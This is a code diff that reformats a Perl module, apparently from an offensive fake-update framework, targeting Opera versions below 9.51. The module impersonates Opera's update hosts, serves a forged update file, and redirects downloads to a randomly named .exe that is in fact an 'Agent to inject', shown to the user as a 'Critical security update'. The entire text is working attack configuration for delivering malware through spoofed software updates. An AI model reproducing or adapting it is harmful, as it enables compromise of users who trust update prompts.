@@ -27,66 +27,70 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Opera',
-    'version' => '1.0',
-    'appver'  => '< 9.51',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => '(xml.opera.com|www.opera.com)',
-    'request' => [
-		    {
-		    'req' => '/update/?', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => '',
-		    'parse' => 1,
-		    'file' => './include/opera/opera_update.xml',
-		    },
-                    {
-                    'req' => '/download', #regex anything
-                    'type' => 'string', #file|string|agent|install
-                    'method' => '', #any
-                    'bin'    => '',
-                    'string' => '',
-                    'parse' => '1',
-                    'file' => '',
-                    'cheader' => "HTTP/1.1 302 Found\r\n"
-                                 ."Location: http://www.opera.com/operaupdate<%RND1%>.exe \r\n"
-                                 ."Content-Length: 0 \r\n"
-                                 . "Connection: close \r\n\r\n",
-                    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'Opera',
+    'version'     => '1.0',
+    'appver'      => '< 9.51',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => '(xml.opera.com|www.opera.com)',
+    'request'     => [
+        {   'req'    => '/update/?',    #regex friendly
+            'type'   => 'file',         #file|string|agent|install
+            'method' => '',             #any
+            'bin'    => 0,
+            'string' => '',
+            'parse'  => 1,
+            'file' => './include/opera/opera_update.xml',
+        },
+        {   'req'     => '/download',               #regex anything
+            'type'    => 'string',                  #file|string|agent|install
+            'method'  => '',                        #any
+            'bin'     => '',
+            'string'  => '',
+            'parse'   => '1',
+            'file'    => '',
+            'cheader' => "HTTP/1.1 302 Found\r\n"
+                . "Location: http://www.opera.com/operaupdate<%RND1%>.exe \r\n"
+                . "Content-Length: 0 \r\n"
+                . "Connection: close \r\n\r\n",
+        },
+        {   'req'    => '.exe',                     #regex friendly
+            'type'   => 'agent',                    #file|string|agent|install
+            'method' => '',                         #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		    'description'  => { 'val' => 'Critical security update',
-			    	  'desc' => 'Description display in the update'},
-                    'version'  => { 'val' => '\'1\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(2)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-				},
-                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
-                                  'hidden' => 1,
-                                'dynamic' =>1,
-                            }			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'description' => {
+            'val'  => 'Critical security update',
+            'desc' => 'Description display in the update'
+        },
+        'version' => {
+            'val' =>
+                '\'1\'.isrcore::utils::RndNum(1).\'.\'.isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'rnd1' => {
+            'val'     => 'isrcore::utils::RndNum(5)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        }
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
